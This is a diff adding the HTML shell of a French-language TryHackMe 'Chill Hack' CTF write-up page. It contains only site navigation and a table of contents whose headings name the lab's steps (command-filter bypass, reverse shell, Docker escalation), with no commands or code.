@@ -1,0 +1,2168 @@
+
+<!doctype html>
+<html lang="fr" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Collection de writeups TryHackMe, HackTheBox et autres CTF">
+      
+      
+        <meta name="author" content="Managone">
+      
+      
+        <link rel="canonical" href="https://managone.github.io/writeups/tryhackme/chill-hack/">
+      
+      
+        <link rel="prev" href="../year-of-the-rabbit/">
+      
+      
+        <link rel="next" href="../gamingserver/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/logo_perso.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.2">
+    
+    
+      
+        <title>Chill Hack - Writeups Cyber en Français</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.57a0d79d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.fb2fffe2.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#chill-hack-tryhackme" class="md-skip">
+          Aller au contenu
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="En-tête">
+    <a href="../.." title="Writeups Cyber en Français" class="md-header__button md-logo" aria-label="Writeups Cyber en Français" data-md-component="logo">
+      
+  <img src="../../assets/logo_perso.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Writeups Cyber en Français
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Chill Hack
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Passer en mode clair"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Passer en mode clair" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Passer en mode sombre"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Passer en mode sombre" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Rechercher" placeholder="Rechercher" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Recherche">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Effacer" aria-label="Effacer" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initialisation de la recherche
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/managone/writeups" title="Aller au dépôt" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    managone/writeups
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Onglets" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Accueil
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+  TryHackMe
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../hackthebox/" class="md-tabs__link">
+          
+  
+  
+  HackTheBox
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Tags
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Writeups Cyber en Français" class="md-nav__button md-logo" aria-label="Writeups Cyber en Français" data-md-component="logo">
+      
+  <img src="../../assets/logo_perso.png" alt="logo">
+
+    </a>
+    Writeups Cyber en Français
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/managone/writeups" title="Aller au dépôt" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    managone/writeups
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Accueil
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackMe
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackMe
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackMe Writeups
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rootme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RootMe
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../simplectf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Simple CTF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ohsint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OhSINT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../picklerick/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pickle Rick
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../basicpentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basic Pentesting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bountyhacker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bounty Hacker
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../agent-sudo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Agent Sudo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crack-the-hash/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Crack the hash
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lazyadmin/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LazyAdmin
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../overpass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overpass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../brooklyn-nine-nine/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brooklyn Nine Nine
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cyborg/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cyborg
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../skynet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Skynet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../anonymous/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anonymous
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ignite/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ignite
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnerability-capstone/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vulnerability Capstone
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net-sec-challenge/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Net Sec Challenge
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wgel-ctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wgel CTF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tomghost/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tomghost
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../brute-it/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brute It
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../anthem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lian-yu/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lian Yu
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../year-of-the-rabbit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Year of the Rabbit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chill Hack
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chill Hack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informations-generales" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Informations générales
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#contexte-et-objectifs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contexte et objectifs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#methodologie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Méthodologie
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Méthodologie">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#etape-1-cartographie-des-services-avec-nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 1 : Cartographie des services avec Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-2-enumeration-ftp-anonyme" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 2 : Enumération FTP anonyme
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-3-enumeration-web-avec-gobuster" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 3 : Enumération web avec Gobuster
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-4-identification-et-bypass-du-filtre-de-commandes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 4 : Identification et bypass du filtre de commandes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-5-reverse-shell-via-injection-de-commandes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 5 : Reverse shell via injection de commandes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-6-mouvement-lateral-vers-apaar-via-helplinesh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 6 : Mouvement latéral vers apaar via helpline.sh
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-7-flag-utilisateur" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 7 : Flag utilisateur
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-8-port-forwarding-et-acces-au-portail-interne" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 8 : Port forwarding et accès au portail interne
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-9-extraction-de-credentials-par-steganographie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 9 : Extraction de credentials par stéganographie
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-10-escalade-via-docker-anurodh-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 10 : Escalade via Docker (anurodh → root)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#synthese-technique" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Synthèse technique
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../gamingserver/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GamingServer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HackTheBox
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox Writeups
+  
+
